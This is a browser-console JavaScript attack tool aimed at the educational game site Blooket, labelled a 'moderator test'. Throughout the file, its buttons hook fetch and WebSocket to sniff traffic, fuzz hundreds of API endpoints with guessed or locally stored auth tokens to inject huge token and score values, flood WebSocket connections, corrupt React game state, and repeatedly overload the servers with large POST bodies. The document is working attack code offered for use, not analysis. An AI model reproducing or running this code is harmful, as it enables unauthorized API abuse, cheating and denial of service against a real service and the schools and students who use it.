(async () => {
    if (document.getElementById('CHAOS_EXPLOIT')) return console.log('Chaos already unleashed!');

    console.log('%c CHAOS EXPLOIT V3.1 | BLOOKET APOCALYPSE %c\n\tAlastair-Appazzola’s Ultimate Moderator Test - March 26, 2025', 'color: #ff00ff; font-size: 2.5rem; font-weight: bold; text-shadow: 0 0 10px #ff00ff', '');

    const style = document.createElement('style');
    style.innerHTML = `
        #CHAOS_EXPLOIT { position: fixed; top: 10px; left: 10px; width: 600px; height: 700px; background: #000; z-index: 99999; color: #0f0; padding: 20px; font-family: monospace; border: 3px solid #ff00ff; box-shadow: 0 0 30px #ff00ff; }
        #buttonContainer { height: 250px; overflow-y: auto; margin-bottom: 15px; }
        .chaosBtn { padding: 12px; margin: 5px 0; background: #222; cursor: pointer; transition: all 0.3s; border: 1px solid #ff00ff; display: block; width: 100%; text-align: center; }
        .chaosBtn:hover { background: #ff00ff; color: #000; transform: scale(1.1); box-shadow: 0 0 15px #ff00ff; }
        .stopBtn { padding: 12px; margin: 5px 0; background: #f00; cursor: pointer; display: none; border: 1px solid #fff; width: 100%; text-align: center; }
        .stopBtn:hover { background: #ff5555; }
        #chaosLog { height: 400px; overflow-y: auto; border-top: 2px solid #0f0; padding-top: 10px; }
        #chaosStats { color: #ff0; font-size: 1rem; margin-bottom: 15px; text-shadow: 0 0 5px #ff0; }
    `;
    document.head.appendChild(style);

    const gui = document.createElement('div');
    gui.id = 'CHAOS_EXPLOIT';
    const stats = document.createElement('div');
    stats.id = 'chaosStats';
    const buttonContainer = document.createElement('div');
    buttonContainer.id = 'buttonContainer';
    const logArea = document.createElement('div');
    logArea.id = 'chaosLog';
    gui.append(stats, buttonContainer, logArea);
    document.body.appendChild(gui);

    let hits = 0, misses = 0, wsConnections = 0, potentials = [];
    const updateStats = () => {
        wsConnections = Math.max(0, wsConnections);
        stats.innerText = `Hits: ${hits} | Misses: ${misses} | WS Active: ${wsConnections} | Potentials: ${potentials.length}`;
    };

    const origLog = console.log;
    console.log = (...args) => {
        origLog(...args);
        logArea.innerHTML += `<div>${new Date().toISOString()} - ${args.join(' ')}</div>`;
        logArea.scrollTop = logArea.scrollHeight;
    };

    console.log('TOTAL CHAOS UNLEASHED—All game modes in Alastair-Appazzola’s crosshairs!');
    const origFetch = window.fetch;
    window.fetch = async (url, opts) => {
        if (url.includes('blooket.com')) {
            console.log('Sniffed Fetch:', { url, method: opts.method || 'GET', headers: opts.headers || {}, body: opts.body || 'N/A' });
            if (opts.body) {
                try {
                    const parsed = JSON.parse(opts.body);
                    if (parsed.token || parsed.amount || parsed.crypto || parsed.points || parsed.score) {
                        console.log('Potential payload:', parsed);
                        potentials.push({ url, method: opts.method || 'POST', headers: opts.headers || {}, body: parsed });
                    }
                } catch {}
            }
        }
        return origFetch(url, opts);
    };

    const liveWSUrls = new Set();
    const origWS = window.WebSocket;
    window.WebSocket = function(url) {
        if (url.includes('blooket.com')) {
            console.log('Sniffed WS Attempt:', url);
            liveWSUrls.add(url);
        }
        const ws = new origWS(url);
        ws.onopen = () => { wsConnections = Math.max(0, wsConnections + 1); updateStats(); console.log('WS Hit:', url); };
        ws.onerror = () => { console.log('WS Miss:', url); };
        ws.onclose = () => { wsConnections = Math.max(0, wsConnections - 1); updateStats(); };
        ws.onmessage = (msg) => console.log('WS Data:', url, msg.data);
        return ws;
    };

    const fuzzEndpoints = async (base) => {
        const prefixes = ['/api', '/v1', '/v2', '/v3', '/game', '/play', '/user', '/stats', '/live', '/data', '/multiplayer'];
        const actions = ['tokens', 'users', 'games', 'state', 'update', 'session', 'player', 'auth', 'cheat', 'points', 'score', 'balance', 'leaderboard', 'progress', 'event'];
        const params = ['?id=', '?token=', '?amount=', '?key=', '?gameId=', '?rand=', '?uid=', '?chaos=', '?mode=', '?score='];
        const endpoints = [];
        for (const prefix of prefixes) {
            for (const action of actions) {
                endpoints.push(`${base}${prefix}/${action}`);
                params.forEach(p => endpoints.push(`${base}${prefix}/${action}${p}${Math.random().toString(36).slice(2)}`));
            }
        }
        return endpoints;
    };

    let abortApi = false, abortWs = false, abortStealth = false, abortState = false, abortFlood = false, abortOverload = false, abortCorrupt = false, abortExploit = false;

    const tests = [
        {
            name: 'API Apocalypse',
            run: () => {
                const btn = document.createElement('div');
                btn.className = 'chaosBtn';
                btn.innerText = 'API Apocalypse';
                const stopBtn = document.createElement('div');
                stopBtn.className = 'stopBtn';
                stopBtn.id = 'stopApiBtn';
                stopBtn.innerText = 'STOP API';
                stopBtn.onclick = () => { abortApi = true; stopBtn.style.display = 'none'; console.log('API Apocalypse aborted!'); };
                btn.onclick = async () => {
                    abortApi = false;
                    stopBtn.style.display = 'block';
                    const bases = ['https://api.blooket.com', 'https://play.blooket.com', 'https://dashboard.blooket.com', 'https://id.blooket.com', 'https://live.blooket.com'];
                    const methods = ['POST', 'GET', 'PUT', 'PATCH', 'DELETE'];
                    const tokenGuesses = [
                        localStorage.token || 'guest',
                        `Bearer ${Math.random().toString(36).slice(2)}`,
                        btoa(JSON.stringify({ id: 'chaos', ts: Date.now() })),
                        'admin', 'moderator', 'hack', 'all_modes'
                    ];
                    for (const base of bases) {
                        const endpoints = await fuzzEndpoints(base);
                        console.log(`Unleashing API apocalypse on ${base} - ${endpoints.length} endpoints...`);
                        for (const url of endpoints) {
                            if (abortApi) break;
                            const method = methods[Math.floor(Math.random() * methods.length)];
                            const token = tokenGuesses[Math.floor(Math.random() * tokenGuesses.length)];
                            console.log('Fuzzing:', url);
                            try {
                                const res = await fetch(url, {
                                    method,
                                    headers: { 
                                        'Authorization': token,
                                        'Content-Type': 'application/json',
                                        'X-Chaos': 'ALASTAIR-APPAZZOLA',
                                        'User-Agent': `ChaosBot/${Math.random()}`,
                                        'Referer': 'https://play.blooket.com',
                                        'Origin': 'https://play.blooket.com'
                                    },
                                    body: method !== 'GET' && method !== 'HEAD' ? JSON.stringify({ 
                                        amount: 999999999, 
                                        tokens: 999999999, 
                                        points: 999999999, 
                                        score: 999999999, 
                                        cheat: true, 
                                        chaos: Math.random(),
                                        override: true,
                                        mode: 'all'
                                    }) : undefined
                                });
                                if (res.ok) {
                                    hits++;
                                    const data = await res.json();
                                    console.log(`API VULN HIT at ${url}:`, data);
                                    potentials.push({ url, method, headers: { 'Authorization': token }, body: { amount: 999999999, tokens: 999999999, points: 999999999, score: 999999999 } });
                                } else {
                                    misses++;
                                    console.log(`No vuln at ${url}:`, res.status);
                                }
                            } catch (e) {
                                misses++;
                                console.log(`Missed ${url}:`, e.message);
                            }
                            await new Promise(r => setTimeout(r, 20));
                        }
                        if (abortApi) break;
                    }
                    stopBtn.style.display = 'none';
                    updateStats();
                };
                buttonContainer.append(btn, stopBtn);
            }
        },
        {
            name: 'WebSocket Annihilation',
            run: () => {
                const btn = document.createElement('div');
                btn.className = 'chaosBtn';
                btn.innerText = 'WebSocket Annihilation';
                const stopBtn = document.createElement('div');
                stopBtn.className = 'stopBtn';
                stopBtn.id = 'stopWsBtn';
                stopBtn.innerText = 'STOP WS';
                stopBtn.onclick = () => { abortWs = true; stopBtn.style.display = 'none'; console.log('WebSocket Annihilation aborted!'); };
                btn.onclick = async () => {
                    abortWs = false;
                    stopBtn.style.display = 'block';
                    const wsBases = ['wss://play.blooket.com', 'wss://api.blooket.com', 'wss://dashboard.blooket.com', 'wss://live.blooket.com', 'wss://multiplayer.blooket.com'];
                    const wsPaths = ['/ws', '/socket', '/game', '/live', '/play', '/cheat', '/realtime', '/v1', '/v2', '/all', ''];
                    const tokenGuesses = [
                        localStorage.token || 'guest',
                        `Bearer ${Math.random().toString(36).slice(2)}`,
                        btoa(JSON.stringify({ id: 'chaos', ts: Date.now() })),
                        'admin_token', 'all_modes_key'
                    ];
                    const liveUrls = liveWSUrls.size ? Array.from(liveWSUrls) : [];
                    console.log('Sniffed WS targets:', liveUrls);
                    const targets = liveUrls.length ? liveUrls : wsBases.flatMap(base => wsPaths.map(path => `${base}${path}`));
                    console.log(`Annihilating ${targets.length} WS connections with ${tokenGuesses.length} keys...`);
                    targets.forEach(url => {
                        if (abortWs) return;
                        tokenGuesses.forEach(token => {
                            if (abortWs) return;
                            const fullUrl = `${url}?token=${encodeURIComponent(token)}&chaos=${Math.random()}`;
                            console.log('Blasting WS:', fullUrl);
                            let retries = 20;
                            const connect = () => {
                                if (abortWs) return;
                                const ws = new WebSocket(fullUrl);
                                ws.onopen = () => {
                                    wsConnections = Math.max(0, wsConnections + 1);
                                    console.log('WS Connected:', fullUrl, '—unleashing hell...');
                                    const flood = setInterval(() => {
                                        if (ws.readyState === 1 && !abortWs) ws.send(JSON.stringify({ 
                                            type: ['cheat', 'auth', 'update', 'score', 'hack', 'points'][Math.floor(Math.random() * 6)], 
                                            tokens: 999999999, 
                                            points: 999999999, 
                                            score: 999999999, 
                                            amount: 999999999, 
                                            chaos: Math.random(),
                                            override: true,
                                            mode: 'all'
                                        }));
                                        else clearInterval(flood);
                                    }, 15);
                                };
                                ws.onerror = () => { if (retries-- && !abortWs) setTimeout(connect, 150); };
                                ws.onmessage = (msg) => {
                                    console.log('WS Response:', fullUrl, msg.data);
                                    if (msg.data.includes('token') || msg.data.includes('points') || msg.data.includes('score')) {
                                        potentials.push({ url: fullUrl, type: 'WS', body: JSON.parse(msg.data) });
                                    }
                                };
                            };
                            connect();
                        });
                    });
                    stopBtn.style.display = 'none';
                };
                buttonContainer.append(btn, stopBtn);
            }
        },
        {
            name: 'Stealth Proxy Domination',
            run: () => {
                const btn = document.createElement('div');
                btn.className = 'chaosBtn';
                btn.innerText = 'Stealth Proxy Domination';
                const stopBtn = document.createElement('div');
                stopBtn.className = 'stopBtn';
                stopBtn.id = 'stopStealthBtn';
                stopBtn.innerText = 'STOP STEALTH';
                stopBtn.onclick = () => { abortStealth = true; stopBtn.style.display = 'none'; console.log('Stealth Proxy Domination aborted!'); };
                btn.onclick = () => {
                    abortStealth = false;
                    stopBtn.style.display = 'block';
                    const tokenGuess = localStorage.token || 'guest';
                    const chaosCode = `
                        const urls = Array(300).fill().map((_, i) => 
                            'https://' + ['api', 'play', 'dashboard', 'id', 'live'][i % 5] + '.blooket.com/' + 
                            ['api', 'v1', 'v2', 'game', 'live', 'multiplayer'][i % 6] + '/' + 
                            ['tokens', 'games', 'stats', 'update', 'auth', 'session', 'points', 'score'][i % 8] + 
                            '?chaos=' + Math.random()
                        );
                        let hits = 0;
                        urls.forEach(url => {
                            if (${abortStealth}) return;
                            fetch(url, {
                                method: ['POST', 'PUT', 'PATCH', 'DELETE'][Math.floor(Math.random() * 4)],
                                headers: { 
                                    'Authorization': '${tokenGuess}',
                                    'Content-Type': 'application/json',
                                    'X-Chaos': 'ALASTAIR-APPAZZOLA',
                                    'Origin': 'https://play.blooket.com',
                                    'Referer': 'https://play.blooket.com/play',
                                    'X-Game': 'all_modes'
                                },
                                body: JSON.stringify({ 
                                    amount: 999999999, 
                                    tokens: 999999999, 
                                    points: 999999999, 
                                    score: 999999999, 
                                    chaos: true,
                                    override: true
                                })
                            })
                            .then(res => res.ok ? res.json() : Promise.reject(res.status))
                            .then(data => { console.log('Stealth Hit:', url, data); hits++; })
                            .catch(e => console.log('Stealth Miss:', url, e));
                        });
                        setTimeout(() => console.log('Stealth Domination Done - Hits:', hits), 20000);
                    `;
                    eval(chaosCode);
                    console.log('Stealth proxy domination unleashed via eval, Alastair-Appazzola!');
                    stopBtn.style.display = 'none';
                };
                buttonContainer.append(btn, stopBtn);
            }
        },
        {
            name: 'State & DOM Obliteration',
            run: () => {
                const btn = document.createElement('div');
                btn.className = 'chaosBtn';
                btn.innerText = 'State & DOM Obliteration';
                const stopBtn = document.createElement('div');
                stopBtn.className = 'stopBtn';
                stopBtn.id = 'stopStateBtn';
                stopBtn.innerText = 'STOP STATE';
                stopBtn.onclick = () => { abortState = true; stopBtn.style.display = 'none'; console.log('State & DOM Obliteration aborted!'); };
                btn.onclick = () => {
                    abortState = false;
                    stopBtn.style.display = 'block';
                    const reactRoot = window._reactRootContainer || window.__REACT_DEVTOOLS_GLOBAL_HOOK__?.renderers?.get(1)?.getFiberRoot();
                    if (reactRoot && !abortState) {
                        let stateNode = reactRoot.current;
                        const mutate = (node) => {
                            if (abortState) return;
                            if (node.memoizedState) {
                                for (let key in node.memoizedState) {
                                    if (typeof node.memoizedState[key] === 'number') {
                                        node.memoizedState[key] = 999999999 + Math.floor(Math.random() * 100000);
                                        console.log(`Mutated ${key} to`, node.memoizedState[key]);
                                    }
                                    if (typeof node.memoizedState[key] === 'object' && node.memoizedState[key]) {
                                        for (let subKey in node.memoizedState[key]) {
                                            if (typeof node.memoizedState[key][subKey] === 'number') {
                                                node.memoizedState[key][subKey] = 999999999 + Math.floor(Math.random() * 100000);
                                                console.log(`Mutated ${key}.${subKey} to`, node.memoizedState[key][subKey]);
                                            }
                                        }
                                    }
                                }
                            }
                            if (node.child) mutate(node.child);
                            if (node.sibling) mutate(node.sibling);
                        };
                        mutate(stateNode);
                        console.log('State annihilated—All game modes in ruins!');
                    }
                    if (!abortState) {
                        const domTargets = document.querySelectorAll('[class*="token"], [class*="point"], [class*="score"], [id*="token"], [id*="score"], [data-amount], [data-points], [data-score]');
                        domTargets.forEach((el, i) => {
                            if (abortState) return;
                            el.textContent = `9999999${i}`;
                            el.style.color = '#ff00ff';
                            el.style.fontSize = '3rem';
                            el.style.textShadow = '0 0 15px #ff00ff';
                            console.log('DOM Nuked:', el);
                        });
                    }
                    stopBtn.style.display = 'none';
                };
                buttonContainer.append(btn, stopBtn);
            }
        },
        {
            name: 'Token Flood Injector',
            run: () => {
                const btn = document.createElement('div');
                btn.className = 'chaosBtn';
                btn.innerText = 'Token Flood Injector';
                const stopBtn = document.createElement('div');
                stopBtn.className = 'stopBtn';
                stopBtn.id = 'stopFloodBtn';
                stopBtn.innerText = 'STOP FLOOD';
                stopBtn.onclick = () => { abortFlood = true; stopBtn.style.display = 'none'; console.log('Token Flood Injector aborted!'); };
                btn.onclick = async () => {
                    abortFlood = false;
                    stopBtn.style.display = 'block';
                    console.log('Injecting token flood across all modes...');
                    const urls = [
                        'https://api.blooket.com/api/users/tokens',
                        'https://play.blooket.com/api/player/update',
                        'https://dashboard.blooket.com/api/stats',
                        'https://live.blooket.com/api/points'
                    ];
                    const tokenGuess = localStorage.token || 'guest';
                    urls.forEach(async url => {
                        for (let i = 0; i < 50 && !abortFlood; i++) {
                            try {
                                const res = await fetch(url, {
                                    method: 'POST',
                                    headers: { 
                                        'Authorization': tokenGuess,
                                        'Content-Type': 'application/json',
                                        'X-Chaos': 'ALASTAIR-APPAZZOLA'
                                    },
                                    body: JSON.stringify({ 
                                        tokens: 999999999, 
                                        points: 999999999, 
                                        score: 999999999, 
                                        amount: 999999999, 
                                        chaos: true,
                                        flood: i
                                    })
                                });
                                if (res.ok) {
                                    hits++;
                                    const data = await res.json();
                                    console.log(`Token Flood HIT at ${url}:`, data);
                                    potentials.push({ url, method: 'POST', headers: { 'Authorization': tokenGuess }, body: { tokens: 999999999, points: 999999999, score: 999999999 } });
                                } else {
                                    misses++;
                                    console.log(`Flood failed at ${url}:`, res.status);
                                }
                            } catch (e) {
                                misses++;
                                console.log(`Flood error at ${url}:`, e.message);
                            }
                            await new Promise(r => setTimeout(r, 30));
                        }
                    });
                    stopBtn.style.display = 'none';
                    updateStats();
                };
                buttonContainer.append(btn, stopBtn);
            }
        },
        {
            name: 'Server Overload',
            run: () => {
                const btn = document.createElement('div');
                btn.className = 'chaosBtn';
                btn.innerText = 'Server Overload';
                const stopBtn = document.createElement('div');
                stopBtn.className = 'stopBtn';
                stopBtn.id = 'stopOverloadBtn';
                stopBtn.innerText = 'STOP OVERLOAD';
                stopBtn.onclick = () => { abortOverload = true; stopBtn.style.display = 'none'; console.log('Server Overload aborted!'); };
                btn.onclick = async () => {
                    abortOverload = false;
                    stopBtn.style.display = 'block';
                    console.log('Overloading Blooket servers—brace for impact!');
                    const bases = ['https://api.blooket.com', 'https://play.blooket.com', 'https://live.blooket.com'];
                    const endpoints = await fuzzEndpoints(bases[0]);
                    const overload = async () => {
                        for (let i = 0; i < 100 && !abortOverload; i++) {
                            const url = bases[i % bases.length] + endpoints[Math.floor(Math.random() * endpoints.length)];
                            console.log('Overloading:', url);
                            try {
                                const res = await fetch(url, {
                                    method: 'POST',
                                    headers: { 
                                        'Content-Type': 'application/json',
                                        'X-Chaos': 'ALASTAIR-APPAZZOLA',
                                        'Connection': 'keep-alive'
                                    },
                                    body: JSON.stringify({ 
                                        payload: Array(10000).fill(Math.random().toString(36)).join(''), 
                                        chaos: true,
                                        overload: i
                                    })
                                });
                                if (res.ok) {
                                    hits++;
                                    console.log(`Overload HIT at ${url}`);
                                } else {
                                    misses++;
                                    console.log(`Overload failed at ${url}:`, res.status);
                                }
                            } catch (e) {
                                misses++;
                                console.log(`Overload error at ${url}:`, e.message);
                            }
                            await new Promise(r => setTimeout(r, 10));
                        }
                        if (!abortOverload) {
                            console.log('Overload cycle complete—reloading!');
                            setTimeout(overload, 500);
                        }
                    };
                    overload();
                    stopBtn.style.display = 'none';
                    updateStats();
                };
                buttonContainer.append(btn, stopBtn);
            }
        },
        {
            name: 'Game State Corruptor',
            run: () => {
                const btn = document.createElement('div');
                btn.className = 'chaosBtn';
                btn.innerText = 'Game State Corruptor';
                const stopBtn = document.createElement('div');
                stopBtn.className = 'stopBtn';
                stopBtn.id = 'stopCorruptBtn';
                stopBtn.innerText = 'STOP CORRUPT';
                stopBtn.onclick = () => { abortCorrupt = true; stopBtn.style.display = 'none'; console.log('Game State Corruptor aborted!'); };
                btn.onclick = () => {
                    abortCorrupt = false;
                    stopBtn.style.display = 'block';
                    console.log('Corrupting game state across all modes...');
                    const reactRoot = window._reactRootContainer || window.__REACT_DEVTOOLS_GLOBAL_HOOK__?.renderers?.get(1)?.getFiberRoot();
                    if (reactRoot && !abortCorrupt) {
                        let stateNode = reactRoot.current;
                        const corrupt = (node) => {
                            if (abortCorrupt) return;
                            if (node.memoizedState) {
                                for (let key in node.memoizedState) {
                                    if (typeof node.memoizedState[key] === 'number') {
                                        node.memoizedState[key] = Math.random() > 0.5 ? -999999999 : 999999999;
                                        console.log(`Corrupted ${key} to`, node.memoizedState[key]);
                                    } else if (typeof node.memoizedState[key] === 'string') {
                                        node.memoizedState[key] = Math.random().toString(36).slice(2);
                                        console.log(`Corrupted ${key} to`, node.memoizedState[key]);
                                    } else if (typeof node.memoizedState[key] === 'object' && node.memoizedState[key]) {
                                        for (let subKey in node.memoizedState[key]) {
                                            if (typeof node.memoizedState[key][subKey] === 'number') {
                                                node.memoizedState[key][subKey] = Math.random() > 0.5 ? -999999999 : 999999999;
                                                console.log(`Corrupted ${key}.${subKey} to`, node.memoizedState[key][subKey]);
                                            }
                                        }
                                    }
                                }
                            }
                            if (node.child) corrupt(node.child);
                            if (node.sibling) corrupt(node.sibling);
                        };
                        corrupt(stateNode);
                        console.log('Game state corrupted—total chaos unleashed!');
                    } else {
                        console.log('No React root—join a game to corrupt!');
                    }
                    stopBtn.style.display = 'none';
                };
                buttonContainer.append(btn, stopBtn);
            }
        },
        {
            name: 'Exploit Everything',
            run: () => {
                const btn = document.createElement('div');
                btn.className = 'chaosBtn';
                btn.innerText = 'Exploit Everything';
                const stopBtn = document.createElement('div');
                stopBtn.className = 'stopBtn';
                stopBtn.id = 'stopExploitBtn';
                stopBtn.innerText = 'STOP EXPLOIT';
                stopBtn.onclick = () => { abortExploit = true; stopBtn.style.display = 'none'; console.log('Exploit Everything aborted!'); };
                btn.onclick = async () => {
                    if (!potentials.length) return console.log('No potentials yet—unleash more chaos first!');
                    abortExploit = false;
                    stopBtn.style.display = 'block';
                    console.log(`Exploiting ${potentials.length} potentials—total annihilation begins...`);
                    let exploitsFound = 0;
                    const loop = async () => {
                        for (const { url, method, headers, body, type } of potentials) {
                            if (abortExploit) break;
                            console.log(`Exploiting ${type || 'API'} at ${url}`);
                            if (type === 'WS') {
                                const ws = new WebSocket(url);
                                ws.onopen = () => {
                                    if (!abortExploit) {
                                        ws.send(JSON.stringify({ 
                                            ...body, 
                                            amount: 999999999, 
                                            tokens: 999999999, 
                                            points: 999999999, 
                                            score: 999999999, 
                                            chaos: true, 
                                            override: true 
                                        }));
                                        console.log('WS Exploit sent:', url);
                                    }
                                };
                            } else {
                                try {
                                    const res = await fetch(url, {
                                        method: method || 'POST',
                                        headers: { 
                                            ...headers, 
                                            'X-Chaos': 'ALASTAIR-APPAZZOLA',
                                            'Origin': 'https://play.blooket.com',
                                            'Referer': 'https://play.blooket.com/play'
                                        },
                                        body: JSON.stringify({ 
                                            ...body, 
                                            amount: 999999999, 
                                            tokens: 999999999, 
                                            points: 999999999, 
                                            score: 999999999, 
                                            chaos: true, 
                                            override: true 
                                        })
                                    });
                                    if (res.ok) {
                                        exploitsFound++;
                                        hits++;
                                        const data = await res.json();
                                        console.log(`Exploit SUCCESS at ${url}:`, data);
                                        if (data.tokens || data.points || data.score) console.log('TOKENS CONFIRMED:', data);
                                    } else {
                                        misses++;
                                        console.log(`Exploit failed at ${url}:`, res.status);
                                    }
                                } catch (e) {
                                    misses++;
                                    console.log(`Exploit error at ${url}:`, e.message);
                                }
                            }
                            await new Promise(r => setTimeout(r, 40));
                        }
                        if (!abortExploit && exploitsFound < potentials.length) {
                            console.log('Looping exploits—more chaos to come!');
                            await new Promise(r => setTimeout(r, 500));
                            loop();
                        } else {
                            console.log(`Chaos complete! Exploits found: ${exploitsFound}`);
                            stopBtn.style.display = 'none';
                        }
                    };
                    loop();
                    updateStats();
                };
                buttonContainer.append(btn, stopBtn);
            }
        }
    ];

    tests.forEach(test => {
        console.log(`Armed: ${test.name}`);
        test.run();
    });

    document.querySelectorAll('#CHAOS_EXPLOIT:not(:last-child)').forEach(el => el.remove());

    setInterval(() => {
        const suspicious = document.querySelectorAll('[data-amount], [data-tokens], [data-points], [data-score]');
        if (suspicious.length) console.log('Suspicious elements detected:', suspicious);
        updateStats();
    }, 2000);
})();
